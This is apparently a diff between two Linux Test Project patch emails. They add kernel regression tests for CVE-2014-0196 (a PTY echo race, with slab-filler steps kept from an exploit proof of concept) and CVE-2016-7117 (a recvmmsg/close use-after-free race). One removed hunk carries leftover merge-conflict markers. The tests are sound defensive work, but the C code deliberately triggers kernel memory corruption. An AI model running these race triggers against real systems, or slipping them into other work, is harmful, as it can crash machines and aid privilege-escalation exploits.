@@ -1,9 +1,10 @@
 From: Richard Palethorpe <rpalethorpe@suse.com>
-Date: Fri, 19 May 2017 14:31:52 +0200
-Subject: [LTP] [PATCH 06/10] Test for CVE-2014-0196 PTY echo race
+Date: Fri, 19 May 2017 14:31:48 +0200
+Subject: [LTP] [PATCH 02/10] Test for vulnerability CVE-2016-7117 in
+	recvmmsg error return path
 In-Reply-To: <20170519123156.8462-1-rpalethorpe@suse.com>
 References: <20170519123156.8462-1-rpalethorpe@suse.com>
-Message-ID: <20170519123156.8462-6-rpalethorpe@suse.com>
+Message-ID: <20170519123156.8462-2-rpalethorpe@suse.com>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
@@ -12,48 +13,60 @@ To: ltp@lists.linux.it
 
 Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
 ---
- runtest/cve                   |   1 +
- testcases/cve/Makefile        |   4 --
- testcases/cve/cve-2014-0196.c | 163 ++++++++++++++++++++++++++++++++++++++++++
- 3 files changed, 164 insertions(+), 4 deletions(-)
- create mode 100644 testcases/cve/cve-2014-0196.c
+ configure.ac                  |   1 +
+ m4/ltp-mmsghdr.m4             |  22 ++++++
+ testcases/cve/cve-2016-7117.c | 165 ++++++++++++++++++++++++++++++++++++++++++
+ 3 files changed, 188 insertions(+)
+ create mode 100644 m4/ltp-mmsghdr.m4
+ create mode 100644 testcases/cve/cve-2016-7117.c
 
-diff --git a/runtest/cve b/runtest/cve
-index 83b53d906..6556ffb0f 100644
---- a/runtest/cve
-+++ b/runtest/cve
-@@ -1,5 +1,6 @@
- # Tests which check for vulnerabilities by CVE number
- cve-2012-0957 cve-2012-0957
-+cve-2014-0196 cve-2014-0196
- cve-2016-4997 cve-2016-4997
- cve-2016-5195 dirtyc0w
- cve-2016-7117 cve-2016-7117
-diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
-index e002387aa..d642b73b4 100644
---- a/testcases/cve/Makefile
-+++ b/testcases/cve/Makefile
-@@ -19,11 +19,7 @@ include $(top_srcdir)/include/mk/testcases.mk
+diff --git a/configure.ac b/configure.ac
+index ecc9a2699..ddfc683a3 100644
+--- a/configure.ac
++++ b/configure.ac
+@@ -189,5 +189,6 @@ LTP_CHECK_EPOLL_PWAIT
+ LTP_CHECK_KEYUTILS_SUPPORT
+ LTP_CHECK_SYNC_ADD_AND_FETCH
+ LTP_CHECK_BUILTIN_CLEAR_CACHE
++LTP_CHECK_MMSGHDR
  
- CFLAGS			+= -D_GNU_SOURCE
- 
--<<<<<<< HEAD
--cve-2016-7117:	LDFLAGS += -lpthread
--=======
- cve-2014-0196:	LDFLAGS += -lpthread -lutil -lrt
- cve-2016-7117:	LDFLAGS += -lpthread -lrt
-->>>>>>> 4dbfb8e79... Add -lrt
- 
- include $(top_srcdir)/include/mk/generic_leaf_target.mk
-diff --git a/testcases/cve/cve-2014-0196.c b/testcases/cve/cve-2014-0196.c
+ AC_OUTPUT
+diff --git a/m4/ltp-mmsghdr.m4 b/m4/ltp-mmsghdr.m4
 new file mode 100644
-index 000000000..9df8282e6
+index 000000000..e7454615c
 --- /dev/null
-+++ b/testcases/cve/cve-2014-0196.c
-@@ -0,0 +1,163 @@
++++ b/m4/ltp-mmsghdr.m4
+@@ -0,0 +1,22 @@
++dnl Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
++dnl
++dnl This program is free software;  you can redistribute it and/or modify
++dnl it under the terms of the GNU General Public License as published by
++dnl the Free Software Foundation; either version 2 of the License, or
++dnl (at your option) any later version.
++dnl
++dnl This program is distributed in the hope that it will be useful,
++dnl but WITHOUT ANY WARRANTY;  without even the implied warranty of
++dnl MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See
++dnl the GNU General Public License for more details.
++dnl
++dnl You should have received a copy of the GNU General Public License
++dnl along with this program. If not, see <http://www.gnu.org/licenses/>.
++
++AC_DEFUN([LTP_CHECK_MMSGHDR],[
++AC_CHECK_TYPES([struct mmsghdr],,,[
++#include <sys/types.h>
++#define __USE_GNU
++#include <sys/socket.h>
++])
++])
+diff --git a/testcases/cve/cve-2016-7117.c b/testcases/cve/cve-2016-7117.c
+new file mode 100644
+index 000000000..721e31a45
+--- /dev/null
++++ b/testcases/cve/cve-2016-7117.c
+@@ -0,0 +1,165 @@
 +/*
 + * Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
-+ * Original POC by Matthew Daley <mattd@bugfuzz.com>
 + *
 + * This program is free software: you can redistribute it and/or modify
 + * it under the terms of the GNU General Public License as published by
@@ -69,150 +82,153 @@ index 000000000..9df8282e6
 + * along with this program. If not, see <http://www.gnu.org/licenses/>.
 + */
 +/*
-+ * This test attempts to cause a buffer overflow using the race condition
-+ * described in CVE-2014-0196. If the test is successful in causing an
-+ * overflow it will most likely result in an immediate Oops, restart or
-+ * freeze. However if it overwrites memory not accessed during the test then
-+ * it could happen at a later time or not at all which is more likely if SLAB
-+ * randomization has been implemented. However as it currently stands, the test
-+ * usually crashes as soon as the delay has been calibrated.
++ * CVE-2016-7117
 + *
-+ * To maximise the chances of the buffer overflow doing immediate detectable
-+ * damage the SLAB filler sockets and ioctls from the original exploit POC
-+ * have been kept even though they are not strictly necessary to reproduce the
-+ * bug.
++ * This tests for a use after free caused by a race between recvmmsg() and
++ * close(). The exit path for recvmmsg() in (a2e2725541f: net: Introduce
++ * recvmmsg socket syscall) called fput() on the active file descriptor before
++ * checking the error state and setting the socket's error field.
 + *
-+ * Further details:
-+ * see linux commit 4291086b1f081b869c6d79e5b7441633dc3ace00
-+ * privilege escalation POC https://www.exploit-db.com/exploits/33516/
++ * If one or more messages are received by recvmmsg() followed by one which
++ * fails, the socket's error field will be set. If just after recvmmsg() calls
++ * fput(), a call to close() is made on the same file descriptor there is a
++ * race between close() releasing the socket object and recvmmsg() setting its
++ * error field.
++ *
++ * fput() does not release a file descriptor's resources (e.g. a socket)
++ * immediatly, it queues them to be released just before a system call returns
++ * to user land. So the close() system call must call fput() after it is
++ * called in recvmmsg(), exit and release the resources all before the socket
++ * error is set.
++ *
++ * Usually if the vulnerability is present the test will be killed with a
++ * kernel null pointer exception. However this is not guaranteed to happen
++ * every time.
++ *
++ * The following was used for reference
++ * https://blog.lizzie.io/notes-about-cve-2016-7117.html
 + */
 +
-+#include <pty.h>
-+#include <stdio.h>
-+#include <string.h>
-+#include <termios.h>
-+#include <limits.h>
++#include <sys/wait.h>
++#include <sys/types.h>
++#include <sys/socket.h>
++#include <sys/syscall.h>
++#include <stdlib.h>
++#include <errno.h>
 +
 +#include "tst_test.h"
-+#include "tst_timer.h"
++#include "tst_safe_net.h"
 +#include "tst_safe_pthread.h"
-+
++#include "tst_timer.h"
 +#include "tst_fuzzy_sync.h"
 +
-+#define ONEOFF_ALLOCS 200
-+#define RUN_ALLOCS    30
-+#define ATTEMPTS      0x7000
-+#define BUFLEN        512
++/* The bug was present in the kernel before recvmmsg was exposed by glibc */
++#include "linux_syscall_numbers.h"
 +
-+static int master_fd, slave_fd;
-+static int filler_ptys[ONEOFF_ALLOCS * 2];
-+static int target_ptys[RUN_ALLOCS * 2];
-+static char buf[BUFLEN];
++#define MSG "abcdefghijklmnop"
++#define RECV_TIMEOUT 1
++#define ATTEMPTS 0x1FFFFF
 +
-+static struct tst_fzsync_pair fzsync_pair = {
-+	.delay_inc = 100,
++#ifndef HAVE_STRUCT_MMSGHDR
++struct mmsghdr {
++	struct msghdr msg_hdr;
++	unsigned int msg_len;
 +};
++#endif
 +
-+static void create_pty(int *amaster, int *aslave)
-+{
-+	if (openpty(amaster, aslave, NULL, NULL, NULL) == -1)
-+		tst_brk(TBROK | TERRNO, "pty creation failed");
-+}
++static int socket_fds[2];
++static struct mmsghdr msghdrs[2] = {
++	{
++		.msg_hdr = {
++			.msg_iov = &(struct iovec) {
++				.iov_len = sizeof(MSG),
++			},
++			.msg_iovlen = 1
++		}
++	},
++	{
++		.msg_hdr = {
++			.msg_iov = &(struct iovec) {
++				.iov_base = (void *)(0xbadadd),
++				.iov_len = ~0,
++			},
++			.msg_iovlen = 1
++		}
++	}
++};
++static char rbuf[sizeof(MSG)];
++static struct timespec timeout = { .tv_sec = RECV_TIMEOUT };
++static struct tst_fzsync_pair fzsync_pair;
 +
 +static void setup(void)
 +{
-+	int i;
-+
 +	tst_fzsync_pair_init(&fzsync_pair);
-+	for (i = 0; i < ONEOFF_ALLOCS; i++)
-+		create_pty(&filler_ptys[i],
-+			   &filler_ptys[i + ONEOFF_ALLOCS]);
-+}
-+
-+static void *overwrite_thread_fn(void *p)
-+{
-+	tst_fzsync_delay_b(&fzsync_pair);
-+	tst_fzsync_time_b(&fzsync_pair);
-+
-+	SAFE_WRITE(0, slave_fd, buf, BUFLEN - 1);
-+	SAFE_WRITE(0, slave_fd, buf, BUFLEN - 1);
-+	SAFE_WRITE(0, slave_fd, buf, BUFLEN);
-+
-+	return p;
-+}
-+
-+static void run(void)
-+{
-+	struct termios t;
-+	pthread_t overwrite_thread;
-+	int i, j;
-+
-+	tst_res(TINFO, "Attempting to overflow into a tty_struct...");
-+
-+	for (i = 0; i < ATTEMPTS; i++) {
-+		create_pty(&master_fd, &slave_fd);
-+
-+		for (j = 0; j < RUN_ALLOCS; j++)
-+			create_pty(&target_ptys[j],
-+				   &target_ptys[j + RUN_ALLOCS]);
-+		SAFE_CLOSE(target_ptys[RUN_ALLOCS / 2]);
-+		SAFE_CLOSE(target_ptys[RUN_ALLOCS / 2 + RUN_ALLOCS]);
-+
-+		SAFE_WRITE(0, slave_fd, buf, 1);
-+
-+		tcgetattr(master_fd, &t);
-+		t.c_oflag &= ~OPOST;
-+		t.c_lflag |= ECHO;
-+		tcsetattr(master_fd, TCSANOW, &t);
-+
-+		SAFE_PTHREAD_CREATE(&overwrite_thread, NULL,
-+				    overwrite_thread_fn, NULL);
-+
-+		tst_fzsync_delay_a(&fzsync_pair);
-+		tst_fzsync_time_a(&fzsync_pair);
-+		SAFE_WRITE(0, master_fd, "A", 1);
-+
-+		SAFE_PTHREAD_JOIN(overwrite_thread, NULL);
-+
-+		tst_fzsync_pair_update(i, &fzsync_pair);
-+
-+		if (!(i & 0x1FFF))
-+			tst_fzsync_pair_info(&fzsync_pair);
-+
-+		for (j = 0; j < RUN_ALLOCS; j++) {
-+			if (j == RUN_ALLOCS / 2)
-+				continue;
-+
-+			ioctl(target_ptys[j], 0xdeadbeef);
-+			ioctl(target_ptys[j + RUN_ALLOCS], 0xdeadbeef);
-+			SAFE_CLOSE(target_ptys[j]);
-+			SAFE_CLOSE(target_ptys[j + RUN_ALLOCS]);
-+		}
-+
-+		ioctl(master_fd, 0xdeadbeef);
-+		ioctl(slave_fd, 0xdeadbeef);
-+		SAFE_CLOSE(master_fd);
-+		SAFE_CLOSE(slave_fd);
-+	}
-+
-+	tst_res(TPASS, "Nothing bad happened, probably.");
 +}
 +
 +static void cleanup(void)
 +{
-+	int i;
++	close(socket_fds[0]);
++	close(socket_fds[1]);
++}
 +
-+	for (i = 0; i < ONEOFF_ALLOCS * 2; i++)
-+		close(filler_ptys[i]);
-+	close(master_fd);
-+	close(slave_fd);
++static void *send_and_close(void *arg)
++{
++	send(socket_fds[0], MSG, sizeof(MSG), 0);
++	send(socket_fds[0], MSG, sizeof(MSG), 0);
++
++	tst_fzsync_delay_b(&fzsync_pair);
++
++	close(socket_fds[0]);
++	close(socket_fds[1]);
++	tst_fzsync_time_b(&fzsync_pair);
++
++	return arg;
++}
++
++static void run(void)
++{
++	pthread_t pt_send;
++	int i, stat, too_early_count = 0;
++
++	msghdrs[0].msg_hdr.msg_iov->iov_base = (void *)&rbuf;
++
++	for (i = 1; i < ATTEMPTS; i++) {
++		if (socketpair(AF_LOCAL, SOCK_DGRAM, 0, socket_fds))
++			tst_brk(TBROK | TERRNO, "Socket creation failed");
++
++		SAFE_PTHREAD_CREATE(&pt_send, 0, send_and_close, 0);
++
++		tst_fzsync_delay_a(&fzsync_pair);
++
++		stat = tst_syscall(__NR_recvmmsg,
++				   socket_fds[1], msghdrs, 2, 0, &timeout);
++		tst_fzsync_time_a(&fzsync_pair);
++		if (stat < 0 && errno == EBADF)
++			too_early_count++;
++		else if (stat == 0)
++			tst_res(TWARN, "No messages received, should be one");
++		else if (stat < 0)
++			tst_res(TWARN | TERRNO, "recvmmsg failed unexpectedly");
++
++		SAFE_PTHREAD_JOIN(pt_send, 0);
++
++		tst_fzsync_pair_update(i, &fzsync_pair);
++		if (!(i & 0x7FFFF)) {
++			tst_res(TINFO, "Too early: %.1f%%",
++				100 * too_early_count / (float)i);
++			tst_fzsync_pair_info(&fzsync_pair);
++		}
++	}
++
++	tst_res(TPASS, "Nothing happened after %d attempts", ATTEMPTS);
 +}
 +
 +static struct tst_test test = {
-+	.tid = "cve-2014-0196",
++	.tid = "cve-2016-7117",
++	.test_all = run,
 +	.setup = setup,
 +	.cleanup = cleanup,
-+	.test_all = run,
++	.min_kver = "2.6.33",
 +};
 -- 
 2.12.2
